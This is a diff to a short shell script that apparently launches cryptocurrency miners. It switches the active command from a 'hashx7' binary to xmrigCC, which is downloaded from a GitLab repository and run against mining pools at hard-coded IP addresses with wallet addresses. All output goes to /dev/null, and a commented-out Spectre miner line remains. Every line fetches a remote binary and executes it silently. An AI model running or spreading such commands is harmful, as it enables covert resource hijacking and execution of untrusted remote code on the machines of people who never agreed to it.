@@ -1,8 +1,8 @@
 #!/bin/sh
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/hashx7 && chmod 777 hashx7 && ./hashx7 -a hashx7 -o 68.183.144.48:443 -u Xu526ZB1hmDZjpPu44pu1YhFDufeTAv9fK.MJ -t4 > /dev/null
+#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/hashx7 && chmod 777 hashx7 && ./hashx7 -a hashx7 -o 68.183.144.48:443 -u Xu526ZB1hmDZjpPu44pu1YhFDufeTAv9fK.MJ -t4 > /dev/null
 
-#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p MJ -k -a randomx -t4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p MJ -k -a randomx -t4 > /dev/null 2>&1
 
 
 #wget https://gitlab.com/majapahlevi/mvp/-/raw/main/tnn-miner1 && chmod 777 tnn-miner1 && ./tnn-miner1 --spectre --wallet spectre:qrzat3hsnclq9mwq5rtqgdp0fyfc6kjlx9v7hwh6tc2y78zy2enkk2z5deydr --daemon-address 142.93.71.111 --port 80 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --threads 4 > /dev/null 2>&1
